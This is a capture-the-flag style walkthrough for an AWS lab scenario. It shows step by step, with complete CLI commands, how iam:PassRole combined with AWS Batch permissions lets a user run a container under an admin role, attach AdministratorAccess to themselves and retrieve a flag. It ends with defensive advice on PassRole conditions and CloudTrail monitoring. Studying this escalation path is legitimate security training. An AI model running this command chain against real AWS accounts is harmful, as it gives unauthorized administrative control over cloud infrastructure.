# Guided Walkthrough: Privilege Escalation via iam:PassRole + batch:RegisterJobDefinition + batch:SubmitJob

This scenario demonstrates a privilege escalation vulnerability where a user with `iam:PassRole`, `batch:RegisterJobDefinition`, and `batch:SubmitJob` permissions can register an AWS Batch job definition that passes a privileged IAM role as the `jobRoleArn`, submit the job, and have the resulting container use those administrative credentials to grant the starting user `AdministratorAccess`.

AWS Batch orchestrates containerized workloads on top of Amazon ECS (or ECS on Fargate). When a job definition specifies a `jobRoleArn`, ECS assumes that role for the task — meaning the container receives the role's credentials automatically through the ECS container credential provider at `169.254.170.2`. An attacker who can pass a privileged role to Batch and submit jobs effectively executes arbitrary AWS API calls as that role without ever calling `sts:AssumeRole` directly.

## The Challenge

You start as `pl-prod-batch-001-to-admin-starting-user` — an IAM user whose credentials were provided via Terraform outputs. At first glance these permissions look like they belong to a data or ML engineer: the ability to register Batch job definitions and submit jobs, plus `iam:PassRole` on a specific role. Your goal is to reach full administrator access.

The target is `pl-prod-batch-001-to-admin-admin-role`, an IAM role carrying `AdministratorAccess`. You cannot assume it directly — there is no `sts:AssumeRole` permission in your policy, and even if there were, the role's trust policy only permits `ecs-tasks.amazonaws.com`. But you can pass it to something else.

## Reconnaissance

Start by confirming who you are and what region you are operating in:

```bash
aws sts get-caller-identity
```

Inspect the inline policy attached to your user to understand the full permission set:

```bash
aws iam list-user-policies --user-name pl-prod-batch-001-to-admin-starting-user
aws iam get-user-policy --user-name pl-prod-batch-001-to-admin-starting-user \
    --policy-name pl-prod-batch-001-to-admin-required-permissions
```

You will see `iam:PassRole` scoped to the admin and execution role ARNs, plus `batch:RegisterJobDefinition` and `batch:SubmitJob`. You also have helpful permissions — `batch:DescribeJobs`, `batch:DescribeJobQueues`, `batch:DescribeComputeEnvironments`, `iam:ListAttachedUserPolicies` — for discovery and monitoring. Discover the existing job queue:

```bash
aws batch describe-job-queues --query 'jobQueues[*].{Name:jobQueueName,State:state}'
```

## Exploitation

### Step 1: Register a Batch job definition with the admin role

Register a job definition using the `amazon/aws-cli` image. Pass the admin role as `jobRoleArn` and the execution role as `executionRoleArn`. Set the container command to attach `AdministratorAccess` to the starting user — the container will run this command as the admin role.

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
REGION="us-east-1"  # adjust to your deployed region
STARTING_USER="pl-prod-batch-001-to-admin-starting-user"
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-batch-001-to-admin-admin-role"
EXECUTION_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-batch-001-to-admin-execution-role"
JOB_DEF_NAME="pl-batch-001-privesc-job-def"

aws batch register-job-definition \
    --region "$REGION" \
    --job-definition-name "$JOB_DEF_NAME" \
    --type container \
    --platform-capabilities FARGATE \
    --container-properties "{
        \"image\": \"amazon/aws-cli:latest\",
        \"jobRoleArn\": \"$ADMIN_ROLE_ARN\",
        \"executionRoleArn\": \"$EXECUTION_ROLE_ARN\",
        \"resourceRequirements\": [
            {\"type\": \"VCPU\", \"value\": \"0.25\"},
            {\"type\": \"MEMORY\", \"value\": \"512\"}
        ],
        \"networkConfiguration\": {\"assignPublicIp\": \"ENABLED\"},
        \"command\": [
            \"iam\", \"attach-user-policy\",
            \"--user-name\", \"$STARTING_USER\",
            \"--policy-arn\", \"arn:aws:iam::aws:policy/AdministratorAccess\"
        ]
    }"
```

Note the `revision` field in the response — you will need it for job submission.

### Step 2: Submit the job to the existing queue

Submit the job to the Fargate job queue. Batch will schedule the container to run on Fargate.

```bash
JOB_DEF_REVISION=1  # replace with the revision from the previous step
JOB_QUEUE="pl-prod-batch-001-to-admin-job-queue"

aws batch submit-job \
    --region "$REGION" \
    --job-name "pl-batch-001-privesc-job" \
    --job-queue "$JOB_QUEUE" \
    --job-definition "${JOB_DEF_NAME}:${JOB_DEF_REVISION}"
```

Note the `jobId` in the response.

### Step 3: Wait for the job to complete

Fargate must provision a container instance before running the job. Poll the job status every 15 seconds until it shows `SUCCEEDED`. This typically takes 1-3 minutes.

```bash
JOB_ID="<job-id from previous step>"

aws batch describe-jobs --region "$REGION" --jobs "$JOB_ID" \
    --query 'jobs[0].status' --output text
```

If the status shows `FAILED`, check the status reason:

```bash
aws batch describe-jobs --region "$REGION" --jobs "$JOB_ID" \
    --query 'jobs[0].statusReason' --output text
```

## Verification

Once the job succeeds, wait 15 seconds for IAM policy propagation, then verify that `AdministratorAccess` was attached to the starting user:

```bash
sleep 15
aws iam list-attached-user-policies --user-name pl-prod-batch-001-to-admin-starting-user
```

Confirm admin access using the starting user's credentials:

```bash
aws iam list-users --max-items 3
```

If this succeeds, you have achieved administrator access.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now attached to your starting user provides implicitly.

Using your starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/batch-001-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them — only the scenario ID in the path changes.

## What Happened

You exploited a privilege escalation path that is easy to overlook during IAM reviews. The `iam:PassRole` permission is often granted to data or ML engineers so they can assign execution roles to compute workloads. When combined with `batch:RegisterJobDefinition` and `batch:SubmitJob`, it becomes a full code execution primitive: you can launch arbitrary container images that run under any role you can pass, without ever calling `sts:AssumeRole` yourself.

The key subtlety is that AWS Batch relies on Amazon ECS under the hood. The `jobRoleArn` is an ECS task role — it must trust `ecs-tasks.amazonaws.com`. When Batch runs the job, ECS injects the role's credentials into the container via the link-local metadata service. The container has no knowledge that it was launched by Batch; it simply finds an IAM role in the environment and uses it.

This pattern appears in real environments where data teams are given flexible Batch permissions for ML training or ETL workloads. The fix is to ensure that any role passable to Batch carries only the minimum permissions needed for data operations — never administrative policies. The `iam:PassRole` permission should also be restricted with an `iam:PassedToService` condition key (e.g., `batch.amazonaws.com` or `ecs-tasks.amazonaws.com`) and ideally a resource condition scoped to specific role name patterns. CloudTrail events to monitor include `batch:RegisterJobDefinition` calls where the `jobRoleArn` references a privileged role.
